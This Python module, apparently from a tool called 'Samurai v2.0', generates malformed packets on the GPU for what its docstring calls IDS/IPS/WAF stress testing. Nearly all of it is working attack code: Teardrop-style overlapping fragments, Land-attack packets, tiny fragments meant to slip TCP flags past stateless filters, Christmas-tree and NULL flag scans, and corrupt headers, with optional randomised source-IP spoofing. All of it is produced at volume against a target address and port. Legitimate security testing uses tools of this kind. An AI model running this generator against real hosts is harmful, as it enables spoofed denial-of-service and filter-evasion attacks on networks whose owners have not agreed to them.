"""Anomaly Packet Generation Module for Samurai v2.0

GPU-accelerated generation of anomalous/malformed packets for IDS/IPS/WAF
stress testing and security validation.

Anomaly Techniques:
    1.  Invalid IP Header Length (IHL)
    2.  Invalid IP Total Length (undersized/oversized)
    3.  Invalid IP Version (non-4, non-6)
    4.  Invalid Protocol Numbers
    5.  Reserved TCP Flags (Christmas Tree, NULL, invalid combos)
    6.  Invalid TCP Data Offset
    7.  Overlapping IP Fragments (Teardrop-style)
    8.  Tiny Fragment Attack (RFC 3128 violation)
    9.  Land Attack (src == dst)
    10. Invalid Checksum Injection
    11. TTL Anomalies (0 TTL, max TTL)
    12. Malformed Options (TCP/IP)

Author: Samurai Team
""" 

import numpy as np
import random
import logging
from typing import List, Optional, Tuple, Dict
from enum import IntEnum

from numba import cuda
from numba.cuda.random import xoroshiro128p_uniform_float32, create_xoroshiro128p_states
import cupy as cp

# Re-use constants from gpu_packet
from .gpu_packet import (
    ETHERNET_HEADER_LEN, IP_HEADER_LEN, TCP_HEADER_LEN_NO_OPT,
    TCP_HEADER_LEN_WITH_OPT, UDP_HEADER_LEN, ICMP_HEADER_LEN,
    TCP_PROTOCOL, UDP_PROTOCOL, ICMP_PROTOCOL,
    TCP_FIN, TCP_SYN, TCP_RST, TCP_PSH, TCP_ACK, TCP_URG, TCP_ECE, TCP_CWR,
    calculate_checksum, write_uint32_be, write_uint16_be,
    calculate_tcp_checksum_optimized, calculate_udp_checksum_optimized,
    calculate_icmp_checksum
)

# ============================================================================
# Anomaly Type Constants
# ============================================================================

class AnomalyType(IntEnum):
    """Anomaly technique identifiers for GPU kernel selection."""
    INVALID_IHL = 0
    INVALID_IP_LENGTH = 1
    INVALID_IP_VERSION = 2
    INVALID_PROTOCOL = 3
    TCP_FLAG_ABUSE = 4
    INVALID_TCP_OFFSET = 5
    OVERLAPPING_FRAGMENTS = 6
    TINY_FRAGMENTS = 7
    LAND_ATTACK = 8
    INVALID_CHECKSUM = 9
    TTL_ANOMALY = 10
    MALFORMED_OPTIONS = 11
    RANDOM_MIX = 99


# TCP Flag Anomaly Sub-Types
FLAG_CHRISTMAS_TREE = 0   # All flags set (FIN+SYN+RST+PSH+ACK+URG+ECE+CWR)
FLAG_NULL = 1             # No flags set
FLAG_SYN_FIN = 2          # SYN+FIN (invalid combo)
FLAG_SYN_RST = 3          # SYN+RST (invalid combo)
FLAG_FIN_ONLY = 4         # FIN without ACK
FLAG_RST_FIN = 5          # RST+FIN
FLAG_ALL_RESERVED = 6     # ECE+CWR only

# Invalid Protocol Numbers (unused/reserved by IANA)
INVALID_PROTOCOLS = [
    143, 144, 145, 146, 147, 148, 149, 150,  # Unassigned
    253, 254,  # Experimental
    252, 251, 250, 249, 248, 247, 246, 245,  # Unassigned high range
]

# ============================================================================
# GPU Device Helper Functions
# ============================================================================

@cuda.jit(device=True)
def write_ethernet_header(buf, offset, gateway_mac):
    """Write Ethernet header with gateway MAC."""
    buf[offset]     = (gateway_mac >> 40) & 0xFF
    buf[offset + 1] = (gateway_mac >> 32) & 0xFF
    buf[offset + 2] = (gateway_mac >> 24) & 0xFF
    buf[offset + 3] = (gateway_mac >> 16) & 0xFF
    buf[offset + 4] = (gateway_mac >> 8) & 0xFF
    buf[offset + 5] = gateway_mac & 0xFF
    # Src MAC placeholder
    write_uint32_be(buf, offset + 6, 0x00000000)
    write_uint16_be(buf, offset + 10, 0x0000)
    # EtherType IPv4
    write_uint16_be(buf, offset + 12, 0x0800)


@cuda.jit(device=True)
def write_base_ip_header(buf, ip_off, total_len, ip_id, ttl, protocol,
                         src_ip, dst_ip, ver_ihl=0x45, flags_frag=0x4000):
    """Write a standard IPv4 header."""
    buf[ip_off]     = ver_ihl
    buf[ip_off + 1] = 0x00  # TOS
    write_uint16_be(buf, ip_off + 2, total_len)
    write_uint16_be(buf, ip_off + 4, ip_id)
    write_uint16_be(buf, ip_off + 6, flags_frag)
    buf[ip_off + 8] = ttl
    buf[ip_off + 9] = protocol
    write_uint16_be(buf, ip_off + 10, 0)  # checksum placeholder
    write_uint32_be(buf, ip_off + 12, src_ip)
    write_uint32_be(buf, ip_off + 16, dst_ip)


@cuda.jit(device=True)
def get_random_src_ip(rng_states, idx, spoof_enabled, real_src_ip,
                      spoof_base_ip, spoof_mask):
    """Generate source IP based on spoofing config."""
    if spoof_enabled == 1:
        rand_val = xoroshiro128p_uniform_float32(rng_states, idx)
        num_hosts = 1 << (32 - spoof_mask)
        return spoof_base_ip + int(rand_val * (num_hosts - 1))
    return real_src_ip


# ============================================================================
# Anomaly Kernel: Main Multi-Type Generator
# ============================================================================

@cuda.jit
def anomaly_packet_kernel(
    packets_buffer, count, target_ip_int, target_port,
    real_src_ip_int, spoof_enabled, has_ethernet,
    rng_states, gateway_mac, spoof_base_ip, spoof_mask,
    anomaly_types, num_anomaly_types, anomaly_intensity
):
    """
    Master anomaly packet generation kernel.

    Each thread generates one anomalous packet. The anomaly type is selected
    round-robin from the anomaly_types array, ensuring diverse traffic.

    Args:
        anomaly_types: Array of AnomalyType values to cycle through
        num_anomaly_types: Length of anomaly_types array
        anomaly_intensity: 0-100, controls how "broken" packets are
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    # --- Select anomaly type for this packet ---
    atype = anomaly_types[idx % num_anomaly_types]

    # --- Common random fields ---
    src_ip = get_random_src_ip(rng_states, idx, spoof_enabled,
                               real_src_ip_int, spoof_base_ip, spoof_mask)

    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)

    rand_ttl = xoroshiro128p_uniform_float32(rng_states, idx)
    ttl = 48 + int(rand_ttl * 81)

    rand_port = xoroshiro128p_uniform_float32(rng_states, idx)
    src_port = 1024 + int(rand_port * 64511)

    # Packet layout constants
    eth_len = ETHERNET_HEADER_LEN if has_ethernet == 1 else 0
    # We use a fixed max packet size for buffer alignment
    max_pkt = 128  # Enough for header anomalies
    offset = idx * max_pkt
    current = offset

    # --- Write Ethernet ---
    if has_ethernet == 1:
        write_ethernet_header(packets_buffer, current, gateway_mac)
        current += ETHERNET_HEADER_LEN

    ip_off = current
    dst_ip = target_ip_int

    # -----------------------------------------------------------------
    # ANOMALY TYPE 0: Invalid IHL
    # -----------------------------------------------------------------
    if atype == 0:
        # IHL should be 5-15 (20-60 bytes). We set it to invalid values.
        rand_ihl = xoroshiro128p_uniform_float32(rng_states, idx)
        if rand_ihl < 0.33:
            invalid_ihl = 0  # IHL=0 (impossibly small)
        elif rand_ihl < 0.66:
            invalid_ihl = 1  # IHL=1 (4 bytes, too small)
        else:
            invalid_ihl = 2  # IHL=2 (8 bytes, too small)

        ver_ihl = (4 << 4) | (invalid_ihl & 0x0F)
        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, ver_ihl, 0x4000)
        # Write valid checksum with "real" 20-byte header
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        # TCP header
        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50  # Data offset = 5
        packets_buffer[tcp_off + 13] = TCP_SYN
        write_uint16_be(packets_buffer, tcp_off + 14, 65535)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)
        tcp_csum = calculate_tcp_checksum_optimized(
            packets_buffer, tcp_off, TCP_HEADER_LEN_NO_OPT, src_ip, dst_ip)
        write_uint16_be(packets_buffer, tcp_off + 16, tcp_csum)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 1: Invalid IP Total Length
    # -----------------------------------------------------------------
    elif atype == 1:
        rand_len = xoroshiro128p_uniform_float32(rng_states, idx)
        if rand_len < 0.5:
            # Undersized: claim length < actual
            fake_total = 10  # Less than minimum IP header
        else:
            # Oversized: claim length >> actual
            fake_total = 65535

        write_base_ip_header(packets_buffer, ip_off, fake_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50
        packets_buffer[tcp_off + 13] = TCP_SYN | TCP_ACK
        write_uint16_be(packets_buffer, tcp_off + 14, 64240)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 2: Invalid IP Version
    # -----------------------------------------------------------------
    elif atype == 2:
        rand_ver = xoroshiro128p_uniform_float32(rng_states, idx)
        if rand_ver < 0.25:
            ver = 0
        elif rand_ver < 0.5:
            ver = 3
        elif rand_ver < 0.75:
            ver = 7
        else:
            ver = 15

        ver_ihl = (ver << 4) | 5
        ip_total = IP_HEADER_LEN + UDP_HEADER_LEN
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             UDP_PROTOCOL, src_ip, dst_ip, ver_ihl, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        udp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, udp_off, src_port)
        write_uint16_be(packets_buffer, udp_off + 2, target_port)
        write_uint16_be(packets_buffer, udp_off + 4, UDP_HEADER_LEN)
        write_uint16_be(packets_buffer, udp_off + 6, 0)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 3: Invalid Protocol Number
    # -----------------------------------------------------------------
    elif atype == 3:
        rand_proto = xoroshiro128p_uniform_float32(rng_states, idx)
        # Pick from unassigned/reserved protocol numbers
        proto_idx = int(rand_proto * 17)
        if proto_idx > 16:
            proto_idx = 16
        # Map to invalid protocol values
        invalid_protos_0 = 143
        invalid_protos_1 = 144
        invalid_protos_2 = 145
        invalid_protos_3 = 253
        invalid_protos_4 = 254
        invalid_protos_5 = 252
        invalid_protos_6 = 251
        invalid_protos_7 = 250

        if proto_idx < 2:
            proto = invalid_protos_0
        elif proto_idx < 4:
            proto = invalid_protos_1
        elif proto_idx < 6:
            proto = invalid_protos_2
        elif proto_idx < 8:
            proto = invalid_protos_3
        elif proto_idx < 10:
            proto = invalid_protos_4
        elif proto_idx < 12:
            proto = invalid_protos_5
        elif proto_idx < 14:
            proto = invalid_protos_6
        else:
            proto = invalid_protos_7

        ip_total = IP_HEADER_LEN + 20
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             proto, src_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        # Write random payload after IP header
        pay_off = ip_off + IP_HEADER_LEN
        for i in range(20):
            rb = xoroshiro128p_uniform_float32(rng_states, idx)
            packets_buffer[pay_off + i] = int(rb * 256) & 0xFF

    # -----------------------------------------------------------------
    # ANOMALY TYPE 4: TCP Flag Abuse (Christmas Tree, NULL, etc.)
    # -----------------------------------------------------------------
    elif atype == 4:
        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50

        # Select flag pattern
        rand_flag = xoroshiro128p_uniform_float32(rng_states, idx)
        if rand_flag < 0.15:
            flags = 0xFF  # Christmas Tree: ALL flags set
        elif rand_flag < 0.30:
            flags = 0x00  # NULL scan: no flags
        elif rand_flag < 0.45:
            flags = TCP_SYN | TCP_FIN  # SYN+FIN (invalid)
        elif rand_flag < 0.60:
            flags = TCP_SYN | TCP_RST  # SYN+RST (invalid)
        elif rand_flag < 0.75:
            flags = TCP_FIN  # FIN without ACK
        elif rand_flag < 0.90:
            flags = TCP_RST | TCP_FIN  # RST+FIN
        else:
            flags = TCP_ECE | TCP_CWR  # Reserved flags only

        packets_buffer[tcp_off + 13] = flags
        write_uint16_be(packets_buffer, tcp_off + 14, 65535)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)
        tcp_csum = calculate_tcp_checksum_optimized(
            packets_buffer, tcp_off, TCP_HEADER_LEN_NO_OPT, src_ip, dst_ip)
        write_uint16_be(packets_buffer, tcp_off + 16, tcp_csum)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 5: Invalid TCP Data Offset
    # -----------------------------------------------------------------
    elif atype == 5:
        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)

        # Invalid data offset: 0, 1, or 15 (should be 5-15 but claiming
        # offset that doesn't match actual header size)
        rand_do = xoroshiro128p_uniform_float32(rng_states, idx)
        if rand_do < 0.33:
            data_off = 0   # Zero offset
        elif rand_do < 0.66:
            data_off = 1   # 4 bytes (< minimum 20)
        else:
            data_off = 15  # 60 bytes (but only 20 bytes present)

        packets_buffer[tcp_off + 12] = (data_off << 4) & 0xF0
        packets_buffer[tcp_off + 13] = TCP_SYN
        write_uint16_be(packets_buffer, tcp_off + 14, 64240)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 8: Land Attack (src IP == dst IP, src port == dst port)
    # -----------------------------------------------------------------
    elif atype == 8:
        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        # Land attack: source = destination
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, dst_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        # src port = dst port (classic Land attack)
        write_uint16_be(packets_buffer, tcp_off, target_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50
        packets_buffer[tcp_off + 13] = TCP_SYN
        write_uint16_be(packets_buffer, tcp_off + 14, 64240)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)
        tcp_csum = calculate_tcp_checksum_optimized(
            packets_buffer, tcp_off, TCP_HEADER_LEN_NO_OPT, dst_ip, dst_ip)
        write_uint16_be(packets_buffer, tcp_off + 16, tcp_csum)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 9: Invalid Checksum
    # -----------------------------------------------------------------
    elif atype == 9:
        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, 0x45, 0x4000)
        # Intentionally corrupt IP checksum
        rand_csum = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint16_be(packets_buffer, ip_off + 10,
                        int(rand_csum * 65535))

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50
        packets_buffer[tcp_off + 13] = TCP_SYN | TCP_ACK
        write_uint16_be(packets_buffer, tcp_off + 14, 65535)
        # Intentionally corrupt TCP checksum too
        rand_tcsum = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint16_be(packets_buffer, tcp_off + 16,
                        int(rand_tcsum * 65535))
        write_uint16_be(packets_buffer, tcp_off + 18, 0)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 10: TTL Anomaly (0, 1, 255)
    # -----------------------------------------------------------------
    elif atype == 10:
        rand_ttl_a = xoroshiro128p_uniform_float32(rng_states, idx)
        if rand_ttl_a < 0.33:
            anom_ttl = 0    # Zero TTL (should be dropped)
        elif rand_ttl_a < 0.66:
            anom_ttl = 1    # TTL=1 (expires at first hop)
        else:
            anom_ttl = 255  # Max TTL (suspicious)

        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id,
                             anom_ttl, TCP_PROTOCOL, src_ip, dst_ip,
                             0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50
        packets_buffer[tcp_off + 13] = TCP_SYN
        write_uint16_be(packets_buffer, tcp_off + 14, 64240)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)
        tcp_csum = calculate_tcp_checksum_optimized(
            packets_buffer, tcp_off, TCP_HEADER_LEN_NO_OPT, src_ip, dst_ip)
        write_uint16_be(packets_buffer, tcp_off + 16, tcp_csum)

    # -----------------------------------------------------------------
    # ANOMALY TYPE 11: Malformed TCP Options
    # -----------------------------------------------------------------
    elif atype == 11:
        # TCP header with garbage options
        tcp_hdr_len = TCP_HEADER_LEN_WITH_OPT  # 40 bytes
        ip_total = IP_HEADER_LEN + tcp_hdr_len
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0xA0  # Data offset = 10 (40 bytes)
        packets_buffer[tcp_off + 13] = TCP_SYN
        write_uint16_be(packets_buffer, tcp_off + 14, 64240)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)

        # Fill options area with malformed data
        opt_off = tcp_off + TCP_HEADER_LEN_NO_OPT
        rand_opt = xoroshiro128p_uniform_float32(rng_states, idx)

        if rand_opt < 0.33:
            # Option kind=2 (MSS) with invalid length=0
            packets_buffer[opt_off] = 2      # MSS kind
            packets_buffer[opt_off + 1] = 0  # Invalid length (should be 4)
            for i in range(2, 20):
                packets_buffer[opt_off + i] = 0xFF
        elif rand_opt < 0.66:
            # Infinite loop: Option kind=1 (NOP) filling everything
            # then an option with length pointing past end
            for i in range(18):
                packets_buffer[opt_off + i] = 1  # NOP
            packets_buffer[opt_off + 18] = 8  # Timestamp kind
            packets_buffer[opt_off + 19] = 255  # Invalid length (> remaining)
        else:
            # Random garbage in options
            for i in range(20):
                rb = xoroshiro128p_uniform_float32(rng_states, idx)
                packets_buffer[opt_off + i] = int(rb * 256) & 0xFF

    # -----------------------------------------------------------------
    # DEFAULT / FALLBACK: Random combination
    # -----------------------------------------------------------------
    else:
        # Generate a valid-looking but slightly broken packet
        ip_total = IP_HEADER_LEN + TCP_HEADER_LEN_NO_OPT
        write_base_ip_header(packets_buffer, ip_off, ip_total, ip_id, ttl,
                             TCP_PROTOCOL, src_ip, dst_ip, 0x45, 0x4000)
        ip_csum = calculate_checksum(packets_buffer, ip_off, IP_HEADER_LEN)
        write_uint16_be(packets_buffer, ip_off + 10, ip_csum)

        tcp_off = ip_off + IP_HEADER_LEN
        write_uint16_be(packets_buffer, tcp_off, src_port)
        write_uint16_be(packets_buffer, tcp_off + 2, target_port)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))
        write_uint32_be(packets_buffer, tcp_off + 8, 0)
        packets_buffer[tcp_off + 12] = 0x50
        packets_buffer[tcp_off + 13] = TCP_SYN
        write_uint16_be(packets_buffer, tcp_off + 14, 64240)
        write_uint16_be(packets_buffer, tcp_off + 16, 0)
        write_uint16_be(packets_buffer, tcp_off + 18, 0)


# ============================================================================
# Overlapping Fragment Kernel (Teardrop-style)
# ============================================================================

@cuda.jit
def overlapping_fragment_kernel(
    packets_buffer, count, target_ip_int, target_port,
    real_src_ip_int, spoof_enabled, has_ethernet,
    rng_states, gateway_mac, spoof_base_ip, spoof_mask,
    frag_size
):
    """
    Generates overlapping IP fragments (Teardrop / Bonk / Rose attack style).

    Creates two fragments where Fragment 2's offset overlaps with Fragment 1's
    data, causing reassembly confusion in vulnerable TCP/IP stacks.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    eth_len = ETHERNET_HEADER_LEN if has_ethernet == 1 else 0
    # Output: 2 fragments per logical packet
    frag1_offset = idx * frag_size * 2
    frag2_offset = frag1_offset + frag_size

    src_ip = get_random_src_ip(rng_states, idx, spoof_enabled,
                               real_src_ip_int, spoof_base_ip, spoof_mask)
    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)
    rand_ttl = xoroshiro128p_uniform_float32(rng_states, idx)
    ttl = 48 + int(rand_ttl * 81)

    # --- FRAGMENT 1: MF=1, Offset=0 ---
    curr = frag1_offset
    if has_ethernet == 1:
        write_ethernet_header(packets_buffer, curr, gateway_mac)
        curr += ETHERNET_HEADER_LEN

    frag1_ip_len = frag_size - eth_len
    write_base_ip_header(packets_buffer, curr, frag1_ip_len, ip_id, ttl,
                         UDP_PROTOCOL, src_ip, target_ip_int, 0x45,
                         0x2000)  # MF=1, offset=0
    ip_csum = calculate_checksum(packets_buffer, curr, IP_HEADER_LEN)
    write_uint16_be(packets_buffer, curr + 10, ip_csum)

    # UDP header in fragment 1
    udp_off = curr + IP_HEADER_LEN
    rand_sp = xoroshiro128p_uniform_float32(rng_states, idx)
    write_uint16_be(packets_buffer, udp_off, 1024 + int(rand_sp * 64511))
    write_uint16_be(packets_buffer, udp_off + 2, target_port)
    write_uint16_be(packets_buffer, udp_off + 4, frag1_ip_len)
    write_uint16_be(packets_buffer, udp_off + 6, 0)

    # Random payload
    pay_start = udp_off + UDP_HEADER_LEN
    remaining = frag_size - eth_len - IP_HEADER_LEN - UDP_HEADER_LEN
    for i in range(remaining):
        rb = xoroshiro128p_uniform_float32(rng_states, idx)
        packets_buffer[pay_start + i] = int(rb * 256) & 0xFF

    # --- FRAGMENT 2: MF=0, OVERLAPPING Offset ---
    curr = frag2_offset
    if has_ethernet == 1:
        write_ethernet_header(packets_buffer, curr, gateway_mac)
        curr += ETHERNET_HEADER_LEN

    frag2_ip_len = frag_size - eth_len
    # KEY ANOMALY: Fragment offset overlaps with Fragment 1
    # Normal: offset should be (frag1_payload_bytes / 8)
    # Anomaly: we use a SMALLER offset, causing overlap
    frag1_payload = frag1_ip_len - IP_HEADER_LEN
    normal_offset = frag1_payload // 8
    # Overlap: go back by 1-3 units (8-24 bytes overlap)
    overlap_back = 1 + int(xoroshiro128p_uniform_float32(rng_states, idx) * 3)
    overlap_offset = normal_offset - overlap_back
    if overlap_offset < 0:
        overlap_offset = 0

    write_base_ip_header(packets_buffer, curr, frag2_ip_len, ip_id, ttl,
                         UDP_PROTOCOL, src_ip, target_ip_int, 0x45,
                         overlap_offset & 0x1FFF)  # MF=0, overlapping offset
    ip_csum2 = calculate_checksum(packets_buffer, curr, IP_HEADER_LEN)
    write_uint16_be(packets_buffer, curr + 10, ip_csum2)

    # Random payload for frag 2
    pay2_start = curr + IP_HEADER_LEN
    remaining2 = frag_size - eth_len - IP_HEADER_LEN
    for i in range(remaining2):
        rb = xoroshiro128p_uniform_float32(rng_states, idx)
        packets_buffer[pay2_start + i] = int(rb * 256) & 0xFF


# ============================================================================
# Tiny Fragment Kernel (RFC 3128 violation)
# ============================================================================

@cuda.jit
def tiny_fragment_kernel(
    packets_buffer, count, target_ip_int, target_port,
    real_src_ip_int, spoof_enabled, has_ethernet,
    rng_states, gateway_mac, spoof_base_ip, spoof_mask
):
    """
    Generates tiny IP fragments that split the TCP header across fragments.

    RFC 791 allows 8-byte fragments. By making Fragment 1 contain only the
    first 8 bytes of the TCP header (src/dst port), the TCP flags are in
    Fragment 2, bypassing stateless packet filters.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    eth_len = ETHERNET_HEADER_LEN if has_ethernet == 1 else 0
    # Tiny frag 1: IP(20) + 8 bytes of TCP = 28 bytes IP payload
    frag1_ip_payload = 8  # Only first 8 bytes of TCP header
    frag1_total = eth_len + IP_HEADER_LEN + frag1_ip_payload
    # Frag 2: IP(20) + remaining TCP (12 bytes) = 32 bytes IP payload
    frag2_ip_payload = 12
    frag2_total = eth_len + IP_HEADER_LEN + frag2_ip_payload
    # Max of two
    slot_size = 64  # Padded to alignment
    frag1_buf = idx * slot_size * 2
    frag2_buf = frag1_buf + slot_size

    src_ip = get_random_src_ip(rng_states, idx, spoof_enabled,
                               real_src_ip_int, spoof_base_ip, spoof_mask)
    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)
    rand_ttl = xoroshiro128p_uniform_float32(rng_states, idx)
    ttl = 48 + int(rand_ttl * 81)

    # --- FRAGMENT 1: First 8 bytes of TCP ---
    curr = frag1_buf
    if has_ethernet == 1:
        write_ethernet_header(packets_buffer, curr, gateway_mac)
        curr += ETHERNET_HEADER_LEN

    ip1_len = IP_HEADER_LEN + frag1_ip_payload
    write_base_ip_header(packets_buffer, curr, ip1_len, ip_id, ttl,
                         TCP_PROTOCOL, src_ip, target_ip_int, 0x45,
                         0x2000)  # MF=1, offset=0
    ip_csum = calculate_checksum(packets_buffer, curr, IP_HEADER_LEN)
    write_uint16_be(packets_buffer, curr + 10, ip_csum)

    tcp_off = curr + IP_HEADER_LEN
    rand_sp = xoroshiro128p_uniform_float32(rng_states, idx)
    write_uint16_be(packets_buffer, tcp_off, 1024 + int(rand_sp * 64511))
    write_uint16_be(packets_buffer, tcp_off + 2, target_port)
    # Seq number (first 4 bytes of remaining 8)
    rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
    write_uint32_be(packets_buffer, tcp_off + 4, int(rand_seq * 0xFFFFFFFF))

    # --- FRAGMENT 2: Rest of TCP header (including flags) ---
    curr = frag2_buf
    if has_ethernet == 1:
        write_ethernet_header(packets_buffer, curr, gateway_mac)
        curr += ETHERNET_HEADER_LEN

    ip2_len = IP_HEADER_LEN + frag2_ip_payload
    # Offset = 8/8 = 1 (8 bytes into original datagram)
    write_base_ip_header(packets_buffer, curr, ip2_len, ip_id, ttl,
                         TCP_PROTOCOL, src_ip, target_ip_int, 0x45,
                         1)  # MF=0, offset=1 (8 bytes)
    ip_csum2 = calculate_checksum(packets_buffer, curr, IP_HEADER_LEN)
    write_uint16_be(packets_buffer, curr + 10, ip_csum2)

